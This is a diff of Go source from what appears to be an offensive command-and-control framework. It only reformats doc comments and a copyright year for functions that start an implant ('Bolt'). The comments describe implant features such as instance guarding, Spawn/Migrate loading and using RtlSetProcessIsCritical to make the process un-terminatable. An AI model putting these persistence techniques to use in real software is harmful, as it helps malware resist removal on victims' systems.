@@ -1,4 +1,4 @@
-// Copyright (C) 2020 - 2022 iDigitalFlame
+// Copyright (C) 2020 - 2023 iDigitalFlame
 //
 // This program is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -36,26 +36,27 @@ import (
 // This function will block and will NOT return (it calls 'device.GoExit').
 //
 // Arguments:
-//   ignore     - If True, this will ignore any currently existing Guardians with
-//                 the same guard name.
-//   load       - If True, this Bolt will look to see if it's being launched as a
-//                 Spawn/Migrate callable. This will use the supplied 'pipe' argument
-//                 to look for (This is the 'pipe' argument passed to spawn/migrate).
-//   critical   - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
-//                 (Windows only obviously). And will make itself un-terminatable
-//                 while running.
-//   guardfirst - If True, enable the Guarding BEFORE attempting to connect. The
-//                 reasoning for this is the default behavior will cause multiple
-//                 Bolts to be created if WorkHours are set and a Flurry is attempting
-//                 to start a Bolt on non-work hours (as Connect will block until
-//                 work hours allow it to connect).
-//   l          - Guardian Linker type to use. If nil, will default to 'Pipe'.
-//   guard      - String name for the Guardian to look for/create. DO NOT FORMAT
-//                 THIS NAME, it will be formatted based on the Linker type.
-//   pipe       - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
-//                 a non-formatted name to be passed to any Spawn/Migrate commands.
-//   c          - Packed Config. The resulting profile will be build when the function
-//                 starts and will silently return if it fails.
+//
+//	ignore     - If True, this will ignore any currently existing Guardians with
+//	              the same guard name.
+//	load       - If True, this Bolt will look to see if it's being launched as a
+//	              Spawn/Migrate callable. This will use the supplied 'pipe' argument
+//	              to look for (This is the 'pipe' argument passed to spawn/migrate).
+//	critical   - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
+//	              (Windows only obviously). And will make itself un-terminatable
+//	              while running.
+//	guardfirst - If True, enable the Guarding BEFORE attempting to connect. The
+//	              reasoning for this is the default behavior will cause multiple
+//	              Bolts to be created if WorkHours are set and a Flurry is attempting
+//	              to start a Bolt on non-work hours (as Connect will block until
+//	              work hours allow it to connect).
+//	l          - Guardian Linker type to use. If nil, will default to 'Pipe'.
+//	guard      - String name for the Guardian to look for/create. DO NOT FORMAT
+//	              THIS NAME, it will be formatted based on the Linker type.
+//	pipe       - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
+//	              a non-formatted name to be passed to any Spawn/Migrate commands.
+//	c          - Packed Config. The resulting profile will be build when the function
+//	              starts and will silently return if it fails.
 func Start(ignore, load, critical, guardfirst bool, l man.Linker, guard, pipe string, c cfg.Config) {
 	defer func() {
 		if err := recover(); err != nil {
@@ -131,28 +132,29 @@ func Start(ignore, load, critical, guardfirst bool, l man.Linker, guard, pipe st
 // This function will block and will NOT return (it calls 'device.GoExit').
 //
 // Arguments:
-//   name       - The service name when running under Windows. This may empty as it
-//                 is ignored under *nix.
-//   ignore     - If True, this will ignore any currently existing Guardians with
-//                 the same guard name.
-//   load       - If True, this Bolt will look to see if it's being launched as a
-//                 Spawn/Migrate callable. This will use the supplied 'pipe' argument
-//                 to look for (This is the 'pipe' argument passed to spawn/migrate).
-//   critical   - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
-//                 (Windows only obviously). And will make itself un-terminatable
-//                 while running.
-//   guardfirst - If True, enable the Guarding BEFORE attempting to connect. The
-//                 reasoning for this is the default behavior will cause multiple
-//                 Bolts to be created if WorkHours are set and a Flurry is attempting
-//                 to start a Bolt on non-work hours (as Connect will block until
-//                 work hours allow it to connect).
-//   l          - Guardian Linker type to use. If nil, will default to 'Pipe'.
-//   guard      - String name for the Guardian to look for/create. DO NOT FORMAT
-//                 THIS NAME, it will be formatted based on the Linker type.
-//   pipe       - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
-//                 a non-formatted name to be passed to any Spawn/Migrate commands.
-//   c          - Packed Config. The resulting profile will be build when the function
-//                 starts and will silently return if it fails.
+//
+//	name       - The service name when running under Windows. This may empty as it
+//	              is ignored under *nix.
+//	ignore     - If True, this will ignore any currently existing Guardians with
+//	              the same guard name.
+//	load       - If True, this Bolt will look to see if it's being launched as a
+//	              Spawn/Migrate callable. This will use the supplied 'pipe' argument
+//	              to look for (This is the 'pipe' argument passed to spawn/migrate).
+//	critical   - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
+//	              (Windows only obviously). And will make itself un-terminatable
+//	              while running.
+//	guardfirst - If True, enable the Guarding BEFORE attempting to connect. The
+//	              reasoning for this is the default behavior will cause multiple
+//	              Bolts to be created if WorkHours are set and a Flurry is attempting
+//	              to start a Bolt on non-work hours (as Connect will block until
+//	              work hours allow it to connect).
+//	l          - Guardian Linker type to use. If nil, will default to 'Pipe'.
+//	guard      - String name for the Guardian to look for/create. DO NOT FORMAT
+//	              THIS NAME, it will be formatted based on the Linker type.
+//	pipe       - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
+//	              a non-formatted name to be passed to any Spawn/Migrate commands.
+//	c          - Packed Config. The resulting profile will be build when the function
+//	              starts and will silently return if it fails.
 func Daemon(name string, ignore, load, critical, guardfirst bool, l man.Linker, guard, pipe string, c cfg.Config) {
 	p, err := c.Build()
 	if err != nil {
